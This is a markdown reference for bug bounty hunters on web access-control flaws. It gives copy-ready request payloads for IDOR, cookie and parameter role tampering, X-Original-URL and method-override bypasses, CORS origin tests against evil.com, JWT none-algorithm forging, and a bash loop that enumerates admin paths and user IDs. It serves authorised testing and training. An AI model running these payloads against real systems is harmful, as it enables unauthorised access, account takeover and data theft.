# ACCESS CONTROL VULNERABILITIES — COMPLETE BUG BOUNTY REFERENCE
> Source: PortSwigger Web Security Academy + PayloadsAllTheThings
> For: Bug bounty hunting, CTF, and security assessments

---

## TABLE OF CONTENTS
1. [Fundamentals & Taxonomy](#1-fundamentals--taxonomy)
2. [Vertical Privilege Escalation](#2-vertical-privilege-escalation)
3. [Horizontal Privilege Escalation (IDOR)](#3-horizontal-privilege-escalation-idor)
4. [Context-Dependent & Multi-Step Bypass](#4-context-dependent--multi-step-bypass)
5. [Platform & Server Misconfigurations](#5-platform--server-misconfigurations)
6. [IDOR Advanced Techniques](#6-idor-advanced-techniques)
7. [CORS & Auth Bypass](#7-cors--auth-bypass)
8. [Detection Methodology](#8-detection-methodology)
9. [Exploitation Payloads](#9-exploitation-payloads)
10. [Tools & Automation](#10-tools--automation)

---

## 1. FUNDAMENTALS & TAXONOMY

Access controls enforce policy: who can do what. When they fail, attackers access resources they shouldn't.

### Types of Access Control
- **Vertical**: Restricts functionality by privilege level. Admin ≠ regular user.
- **Horizontal**: Restricts resources by user identity. User A can't see User B's data.
- **Context-dependent**: Restricts based on application state (e.g., can't edit cart after payment).

### Common Root Causes
- Application doesn't enforce controls on admin URLs
- User-controllable parameters decide access (hidden fields, cookies, query strings)
- Platform/framework misconfiguration (method-based rules)
- URL parsing discrepancies between front-end and back-end
- Inconsistent path normalization (trailing slashes, case, encoding)
- Missing function-level checks on API endpoints

---

## 2. VERTICAL PRIVILEGE ESCALATION

### 2.1 Unprotected Functionality
Admin pages may be accessible to anyone:
```bash
# Direct access
curl https://target.com/admin
curl https://target.com/admin/dashboard
curl https://target.com/admin/deleteUser

# Common admin paths
curl https://target.com/administrator
curl https://target.com/backoffice
curl https://target.com/manage
curl https://target.com/console
curl https://target.com/internal
curl https://target.com/debug
```

### 2.2 Information Disclosure Leading to Access
- **robots.txt** often leaks admin URLs: `curl https://target.com/robots.txt`
- **JavaScript source** reveals admin paths even for non-admin users
- **HTML comments** contain admin functionality hints
- **JavaScript bundles** (minified) contain API endpoints and admin routes

### 2.3 Parameter-Based Access Control (Role Manipulation)
App stores role in user-controllable parameter:
```bash
# URL parameter
GET /dashboard?admin=true
GET /dashboard?role=admin
GET /dashboard?role=1
GET /dashboard?isAdmin=1
GET /dashboard?privilege=2

# Hidden form fields — change in POST body
POST /profile
name=wiener&role=admin

# Cookie manipulation
Cookie: role=admin
Cookie: isAdmin=true
Cookie: user_type=admin
Cookie: access_level=3
Cookie: logged_in=true

# Referrer-based (test if server checks Referer)
GET /admin/dashboard
Referer: https://target.com/admin
```

### 2.4 Forced Browsing to Protected Pages
```bash
# Common sensitive endpoints
curl https://target.com/api/internal/users
curl https://target.com/api/admin/config
curl https://target.com/graphql  # Query admin-only fields
curl /debug/vars     # Go expvar
curl /debug/pprof/   # Go profiling
curl /actuator       # Spring Boot
curl /actuator/env   # Spring Boot env vars
curl /metrics        # Prometheus
curl /.env           # Environment file
curl /server-status  # Apache
```

---

## 3. HORIZONTAL PRIVILEGE ESCALATION (IDOR)

### 3.1 Basic IDOR Detection
```bash
# Step 1: Login as user A, note a request with user ID
GET /api/user/123  → returns user A's data

# Step 2: Change ID to user B's
GET /api/user/124  → if returns user B's data = IDOR

# Common parameter patterns
GET /api/users/123
GET /api/profile/123
GET /api/documents/123
GET /api/invoices/123
GET /api/orders/123
GET /api/files/abc-def-ghi  (UUID)
```

### 3.2 IDOR via API Endpoints
```bash
# REST API
GET /api/v1/users/{victim_id}
PUT /api/v1/users/{victim_id}  # with attacker data
DELETE /api/v1/users/{victim_id}

# GraphQL
POST /graphql
{"query":"{user(id: 123) {name email}}"}"

# Batch requests — one might bypass IDOR
POST /api/batch
[
  {"method":"GET","url":"/api/user/123"},
  {"method":"GET","url":"/api/user/124"}
]
```

### 3.3 IDOR via UUID/ID Prediction
```bash
# UUID patterns
550e8400-e29b-41d4-a716-446655440000  # UUID v4
00000001-0000-0000-0000-000000000000  # Sequential in UUID format

# Sequential numeric IDs
/user/1 → /user/2 → /user/3

# UUID v1 (timestamp-based, predictable if you know server start time)
# Use https://www.fourthgoods.co.uk/tooling/uuid-unwrap/
```

### 3.4 IDOR in Multi-Step Processes
```bash
# Step 1: Initiate action with own data
POST /api/transfer
{"from_account":"111","to_account":"222","amount":100}

# Step 2: Modify victim's data before confirmation
POST /api/transfer/confirm
{"from_account":"111","to_account":"VICTIM_ACCOUNT","amount":100000}
```

---

## 4. CONTEXT-DEPENDENT & MULTI-STEP BYPASS

### 4.1 Workflow Bypass via Forced Browsing
Skip steps in multi-step processes:
```bash
# Normal flow: Login → MFA → Dashboard
# Attack: Login → Force-browse to /dashboard (bypass MFA)

# E-commerce: Add to cart → Pay → Confirm
# Attack: Add to cart → Force-browse to /order/confirmation

# Password reset: Enter email → Receive code → Enter code → Set password
# Attack: Enter email → Force-browse to /reset/set-password
```

### 4.2 State Manipulation
```bash
# Race condition in state transitions
# Send DELETE and GET simultaneously
# GET might return data before DELETE completes

# Reuse tokens/sessions from different contexts
POST /api/action
Authorization: Bearer TOKEN_FROM_USER_A
Body: {"target": "VICTIM_RESOURCE"}
```

---

## 5. PLATFORM & SERVER MISCONFIGURATIONS

### 5.1 HTTP Method Override
```bash
# Front-end restricts DELETE on /admin, but back-end accepts other methods
DELETE /admin/deleteUser → 403

# Try alternatives:
POST /admin/deleteUser
X-HTTP-Method-Override: DELETE

POST /admin/deleteUser
X-Method-Override: DELETE

POST /admin/deleteUser
X-HTTP-Method: DELETE

TRACE /admin/deleteUser  # Some servers allow TRACE for method override

# HTTP method tampering
GET /admin/deleteUser?id=1    # Sometimes GET works instead of POST
PUT /admin/deleteUser?id=1    # PUT might bypass POST-only restrictions
PATCH /admin/deleteUser?id=1
```

### 5.2 URL Header Bypass
```bash
# Front-end uses URL path for ACL, back-end uses header
POST / HTTP/1.1
X-Original-URL: /admin

POST / HTTP/1.1
X-Rewrite-URL: /admin

POST / HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1

# Combine with method override
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
X-HTTP-Method-Override: DELETE
```

### 5.3 URL Parsing Discrepancies
```bash
# Case sensitivity
/ADMIN vs /admin

# Path normalization
/admin/ vs /admin
/admin//dashboard vs /admin/dashboard
/admin/../admin/dashboard
/admin%2f vs /admin/

# Spring suffix pattern match (if useSuffixPatternMatch=true)
/admin/dashboard.x
/admin/dashboard*

# Wildcard suffix
/admin/dashboard;.json
/admin/dashboard?anything
```

---

## 6. IDOR ADVANCED TECHNIQUES (from PayloadsAllTheThings)

### 6.1 IDOR via API Key/Token
```bash
# API request with predictable key
GET /api/v1/user/123?key=API_KEY_123
# Try: API_KEY_124, API_KEY_0001, etc.
```

### 6.2 IDOR via JWT Claims
```bash
# Decode JWT payload, find user_id or sub claim
# Modify and re-sign (if weak secret or none algorithm)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMjN9.
```

### 6.3 IDOR via Race Condition
```bash
# Two users delete same resource simultaneously
DELETE /api/file/123  (User A)
DELETE /api/file/123  (User B)
# Both may succeed if no proper locking
```

### 6.4 IDOR in File Downloads
```bash
# Predict file paths
GET /files/users/123/report.pdf
GET /files/users/124/report.pdf
GET /uploads/2024/01/123/secret.pdf
GET /uploads/2024/01/124/secret.pdf
```

### 6.5 IDOR in Password Reset
```bash
# Reset token predictable based on user ID
POST /api/reset-password
{"email":"victim@test.com"}
# Response might leak token: {"token":"abc123"}
# Or token is guessable: /reset/{user_id}/{timestamp}
```

---

## 7. CORS & AUTH BYPASS

### 7.1 CORS Misconfiguration
```bash
# Test: Add Origin header
GET /api/userinfo HTTP/1.1
Origin: https://evil.com

# If response contains:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
→ CORS bypass: attacker can steal user data

# Check for regex bypass
Origin: https://evil.target.com
Origin: https://target.com.evil.com
Origin: https://target.com.attacker.com
Origin: https://subdomain.target.com.evil.com
```

### 7.2 JWT Bypass
```bash
# None algorithm attack
# Change header: {"alg":"none"} and remove signature

# Weak secret
# Use hashcat/john to crack: hashcat -m 16500 jwt.txt wordlist.txt

# Key confusion (RS256 → HS256)
# Sign with public key instead of private key
```

---

## 8. DETECTION METHODOLOGY

### Step-by-Step
1. **Enumerate endpoints** — Spider/crawl the app, note all URLs
2. **Create two users** — Regular (A) and target/other (B)
3. **Map access controls** — What can A do? What endpoints return data?
4. **Test vertical** — Can A access admin paths? Try common admin URLs
5. **Test horizontal** — Change user IDs, account parameters, resource IDs
6. **Test parameter tampering** — Modify role, permission, and access params
7. **Test HTTP methods** — Try different methods on each endpoint
8. **Test headers** — X-Original-URL, X-Rewrite-URL, X-Forwarded-For
9. **Check robots.txt, sitemap.xml, JS bundles** — Look for hidden endpoints
10. **Test API endpoints** — Check for function-level access control

### Key Indicators
- Different response when logged in vs out
- Data appears for other users when changing ID parameter
- Admin functionality accessible without admin role
- HTTP method changes bypass access restrictions
- HTTP headers override access control decisions

---

## 9. EXPLOITATION PAYLOADS

### Quick Access Control Test Script
```bash
#!/bin/bash
TARGET="https://target.com"

# Test common admin paths
for path in admin administrator backoffice manage console internal api/admin api/debug; do
  echo "Testing: $path"
  curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path"
  echo ""
done

# Test user IDs
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "ID $i: %{http_code}\n" "$TARGET/api/users/$i"
done
```

### Burp Suite Macros for IDOR
```
1. Record macro: Login as user A → Make API call as A → Note response
2. Record macro: Login as user B → Make same API call → Note response  
3. Compare: If B gets A's data = IDOR
```

---

## 10. TOOLS & AUTOMATION

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept/modify requests, Intruder for IDOR enumeration |
| autorize | Burp extension for automatic authorization testing |
| AuthMatrix | Burp extension for access control testing |
| WFuzz | Directory/endpoint brute-force |
| ffuf | Fast endpoint discovery |
| ffuf + wordlist | Admin panel discovery |
| git-dorker | Find exposed admin paths in git repos |
| Arjun | Hidden parameter discovery |

### Recommended Wordlists
- `/usr/share/wordlists/seclists/Discovery/Web-Content/admin-panels.txt`
- `/usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints.txt`
- `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-directories.txt`
- `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt`

---

## RAPID REFERENCE: ACCESS CONTROL CHECKS PER ENDPOINT

For EVERY endpoint discovered, test:
- [ ] Change user ID / account parameter
- [ ] Remove authentication (no cookie/token)
- [ ] Change HTTP method (GET→POST→PUT→DELETE)
- [ ] Add admin headers (X-Original-URL, X-Rewrite-URL)
- [ ] Check if endpoint exists without auth (404 vs 403 = endpoint exists)
- [ ] Test with different user roles
- [ ] Check response for excessive data exposure
- [ ] Test API versioning bypass (/v1/ → /v2/ → /internal/)
- [ ] Check CORS headers
- [ ] Test IDOR on all numeric/string IDs

---

*Last updated: 2026-09-03*
*Sources: PortSwigger Academy, PayloadsAllTheThings, HackerOne Hacktivity*
